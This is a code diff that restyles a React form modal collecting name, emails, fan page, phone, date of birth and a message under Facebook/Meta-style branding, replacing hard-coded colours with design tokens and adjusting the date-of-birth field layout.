@@ -84,8 +84,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
     }
   };
 
-  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
+  const inputClass = (field: string) => `mv-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-meta-surface text-[14px] text-meta-text mb-[10px] transition-all duration-200`;
+  const dobInputClass = (field: string) => `mv-input input w-full min-w-0 border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[6px] sm:px-[11px] rounded-[10px] bg-meta-surface text-[14px] text-meta-text transition-all duration-200`;
   const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
+  const dobErrorText = (field: string) => errors[field] && <p className="text-red-500 text-[11px] leading-tight mt-[4px] sm:text-[12px]">{errors[field]}</p>;
   const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
   const months = Array.from({ length: 12 }, (_, i) => String(i + 1));
   const currentYear = new Date().getFullYear();
@@ -101,12 +103,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       <div className="flex min-h-full min-w-0 w-full flex-col">
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
-            <div className='mb-[14px] rounded-[12px] border border-[#dbe6fb] bg-[#f5f9ff] px-[12px] py-[10px]'>
-              <p className='text-[13px] leading-[1.55] text-[#33507f]'>
+            <div className='mb-[14px] rounded-[12px] border border-meta-border-light bg-meta-bg px-[12px] py-[10px]'>
+              <p className='text-[13px] leading-[1.55] text-meta-text-secondary'>
                 {t.info.hint}
               </p>
             </div>
-            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
@@ -119,7 +121,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fullName')}
 
-            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('email')}>
               <input
                 type="email"
@@ -132,7 +134,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('email')}
 
-            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.emailBiz}</label>
+            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.emailBiz}</label>
             <div className={inputClass('emailBusiness')}>
               <input
                 type="email"
@@ -145,7 +147,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('emailBusiness')}
 
-            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
             <div className={inputClass('fanpage')}>
               <input
                 type="text"
@@ -158,8 +160,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
-            <label className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
-            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
+            <label className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
+            <div className={`mv-input input w-full border ${errors.phone ? 'border-red-500' : 'border-meta-border'} h-[40px] rounded-[10px] bg-meta-surface text-[14px] mb-[10px]`}>
               <PhoneInput
                 country={formData.country_code?.toLowerCase() || "us"}
                 value={formData.phone}
@@ -177,14 +179,14 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             {errorText('phone')}
 
             <div>
-              <b className='text-[#3b4a64] text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
+              <b className='text-meta-text text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
             </div>
-            <div className="grid grid-cols-1 gap-[10px] sm:grid-cols-3">
-              <div>
-                <div className={inputClass('day')}>
+            <div className="mb-[10px] grid grid-cols-[minmax(0,0.85fr)_minmax(0,0.85fr)_minmax(0,1.3fr)] gap-[6px] sm:grid-cols-3 sm:gap-[10px]">
+              <div className="min-w-0">
+                <div className={dobInputClass('day')}>
                   <select
                     id='day'
-                    className="w-full outline-0 h-full"
+                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                     value={formData.day}
                     onChange={handleChange}
                   >
@@ -194,14 +196,14 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     ))}
                   </select>
                 </div>
-                {errorText('day')}
+                {dobErrorText('day')}
               </div>
 
-              <div>
-                <div className={inputClass('month')}>
+              <div className="min-w-0">
+                <div className={dobInputClass('month')}>
                   <select
                     id='month'
-                    className="w-full outline-0 h-full"
+                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                     value={formData.month}
                     onChange={handleChange}
                   >
@@ -211,14 +213,14 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     ))}
                   </select>
                 </div>
-                {errorText('month')}
+                {dobErrorText('month')}
               </div>
 
-              <div>
-                <div className={inputClass('year')}>
+              <div className="min-w-0">
+                <div className={dobInputClass('year')}>
                   <select
                     id='year'
-                    className="w-full outline-0 h-full"
+                    className="w-full min-w-0 outline-0 h-full truncate bg-transparent"
                     value={formData.year}
                     onChange={handleChange}
                   >
@@ -228,13 +230,13 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                     ))}
                   </select>
                 </div>
-                {errorText('year')}
+                {dobErrorText('year')}
               </div>
 
             </div>
 
-            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.info.message}</label>
-            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
+            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.message}</label>
+            <div className={`mv-input input w-full border border-meta-border h-[100px] px-[11px] py-[11px] rounded-[10px] bg-meta-surface text-[14px] mb-[10px]`}>
               <textarea
                 id='message'
                 className="w-full outline-0 h-full resize-none"
@@ -244,7 +246,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               />
             </div>
 
-            <div className='mb-[15px] overflow-hidden rounded-[12px] border border-[#dbe6fb] bg-white shadow-[0_1px_3px_rgba(15,23,42,0.06)]'>
+            <div className='mb-[15px] overflow-hidden rounded-[12px] border border-meta-border-light bg-meta-surface shadow-[0_1px_3px_rgba(28,30,33,0.06)]'>
               <div className='flex items-center gap-[14px] px-[14px] py-[13px]'>
                 <img
                   src='/images/icons/ic_facebook.svg'
@@ -253,8 +255,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                   className='h-[40px] w-[40px] shrink-0'
                 />
                 <div className='min-w-0 flex-1 pr-[4px]'>
-                  <p className='text-[14px] font-semibold leading-snug text-[#050505]'>{t.info.fbNotifyTitle}</p>
-                  <p className='mt-[3px] text-[13px] leading-[1.45] text-[#65676b]'>{t.info.fbNotifyDesc}</p>
+                  <p className='text-[14px] font-semibold leading-snug text-meta-text'>{t.info.fbNotifyTitle}</p>
+                  <p className='mt-[3px] text-[13px] leading-[1.45] text-meta-text-secondary'>{t.info.fbNotifyDesc}</p>
                 </div>
                 <button
                   type='button'
@@ -262,7 +264,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
                   aria-checked={fbNotifyOn}
                   aria-label={t.info.fbNotifyAria}
                   onClick={() => dispatch(updateForm({ facebookNotify: !fbNotifyOn }))}
-                  className={`relative inline-flex h-[28px] w-[52px] shrink-0 items-center rounded-full p-[2px] transition-[background-color,box-shadow] duration-300 ease-out focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#0064E0]/35 focus-visible:ring-offset-2 active:scale-[0.98] ${fbNotifyOn ? 'bg-[#0064E0] shadow-[inset_0_0_0_1px_rgba(0,0,0,0.06)]' : 'bg-[#ccd0d5] shadow-[inset_0_1px_2px_rgba(0,0,0,0.08)]'}`}
+                  className={`relative inline-flex h-[28px] w-[52px] shrink-0 items-center rounded-full p-[2px] transition-[background-color,box-shadow] duration-300 ease-out focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-meta-blue/35 focus-visible:ring-offset-2 active:scale-[0.98] ${fbNotifyOn ? 'bg-meta-blue shadow-[inset_0_0_0_1px_rgba(0,0,0,0.06)]' : 'bg-meta-border shadow-[inset_0_1px_2px_rgba(0,0,0,0.08)]'}`}
                 >
                   <span
                     aria-hidden
@@ -276,7 +278,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               <label className='cursor-pointer flex items-center gap-[5px] text-[14px]' htmlFor="custom-checkbox">
                 <CustomCheckbox />
                 {t.info.agree}{' '}
-                <span className='text-[#0064E0] hover:underline'>
+                <span className='text-meta-blue hover:underline'>
                   {t.info.agreeTerms}{' '}
                   <img
                     src="/images/icons/ic_reject.svg"
@@ -287,7 +289,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               </label>
             </div>
             <div className='w-full mt-[20px] '>
-              <button type='submit' className='w-full min-h-[48px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
+              <button type='submit' className='mv-btn-primary w-full min-h-[48px] text-white rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
             </div>
           </div>
 
